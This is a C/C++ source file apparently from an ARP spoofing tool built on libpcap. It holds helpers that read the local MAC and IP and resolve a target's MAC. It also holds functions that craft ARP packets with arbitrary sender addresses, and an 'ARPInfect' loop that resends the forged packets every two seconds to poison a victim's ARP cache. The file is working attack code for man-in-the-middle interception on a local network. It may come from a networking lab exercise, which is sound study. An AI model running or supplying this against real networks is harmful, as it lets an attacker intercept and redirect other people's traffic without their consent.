#include "arp_util.h"

void getmac(const char *byte){
	int i;
	for(i = 0; i < 5; i++)
		printf("%02x:", *(uint8_t *)&byte[i]);
	printf("%02x\n", *(uint8_t *)&byte[i]);
}

void getMyMAC(const char *dev, uint8_t *mac){
	struct ifreq ifr;
	int s;
	if ((s = socket(AF_INET, SOCK_STREAM,0)) < 0) {
			perror("socket");
			return;
	}

	strcpy(ifr.ifr_name, dev);
	if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
			perror("ioctl");
			return;
	}

	memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
	close(s);
}

void getMyIP(const char *dev, uint8_t *ip){
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	/* I want to get an IPv4 IP address */
	ifr.ifr_addr.sa_family = AF_INET;

	/* I want IP address attached to "eth0" */
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

	ioctl(fd, SIOCGIFADDR, &ifr);

	close(fd);

	memcpy(ip, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), 4);
}

void getIPfromMAC(pcap_t *handle, const char *dev, uint8_t *targetip, uint8_t *targetmac){
	if(handle == NULL)
		return;

	arp_packet packet;

	memset(packet.ether.dest, 0xff, 6);
	getMyMAC(dev, packet.ether.src);

	packet.ether.type = htons(ETHERTYPE_ARP);

	packet.arp.htype = htons(1);
	packet.arp.ptype = htons(ETHERTYPE_IP);
	packet.arp.hlen = 6;
	packet.arp.plen = 4;
	packet.arp.oper = htons(ARP_REQUEST);

	memcpy(packet.arp.sha, packet.ether.src, ETHER_ADDR_LEN);
	getMyIP(dev, packet.arp.spa);
	memset(packet.arp.tha, 0x00, ETHER_ADDR_LEN);
	memcpy(packet.arp.tpa, targetip, 4);

	pcap_sendpacket(handle, (const uint8_t *)&packet, sizeof(arp_packet));

	arp_packet *result;
	struct pcap_pkthdr *header;
	int res;

	while(1){
		res = pcap_next_ex(handle, &header, (const u_char **)&result);
		if(res < 0){
			printf("getIPfromMAC fail...\n");
			return;
		}

		if(result->ether.type == htons(ETHERTYPE_ARP)){
			if(result->arp.oper == htons(ARP_REPLY))
				if(!memcmp(result->ether.dest, packet.ether.src, 6))
					break;
		}
	}
	memcpy(targetmac, result->arp.sha, 6);
}

void ARPSend(pcap_t *handle, const char *dev, uint16_t oper, uint8_t *senderip, uint8_t *sendermac, uint8_t *targetip, uint8_t *targetmac){
	if(handle == NULL)
		return;
	
	arp_packet packet;

	memcpy(packet.ether.dest, targetmac, 6);
	memcpy(packet.ether.src, sendermac, 6);

	packet.ether.type = htons(ETHERTYPE_ARP);

	packet.arp.htype = htons(1);
	packet.arp.ptype = htons(ETHERTYPE_IP);
	packet.arp.hlen = 6;
	packet.arp.plen = 4;
	packet.arp.oper = htons(oper);

	memcpy(packet.arp.sha, sendermac, ETHER_ADDR_LEN);
	memcpy(packet.arp.spa, senderip, 4);
	memcpy(packet.arp.tha, targetmac, ETHER_ADDR_LEN);
	memcpy(packet.arp.tpa, targetip, 4);

	pcap_sendpacket(handle, (const uint8_t *)&packet, sizeof(arp_packet));
}

void ARPInfect(pcap_t *handle, const char *dev, uint16_t oper, uint8_t *ip, uint8_t *mac, uint8_t *ip2, uint8_t *mac2){
	if(handle == NULL)
		return;
	while(1){
		ARPSend(handle, dev, oper, ip, mac, ip2, mac2);
		sleep(2);
	}
}

void printPacket(ethernet *ether){
	if(ether == NULL)
		return;

	if(ether->type == htons(ETHERTYPE_IP)){
		ip *iph = (ip *)((char *)ether + sizeof(ethernet));
		cout << "ip src : " << inet_ntoa(iph->ip_srcaddr) << endl;
		cout << "ip dest : " << inet_ntoa(iph->ip_destaddr) << endl;
	}

}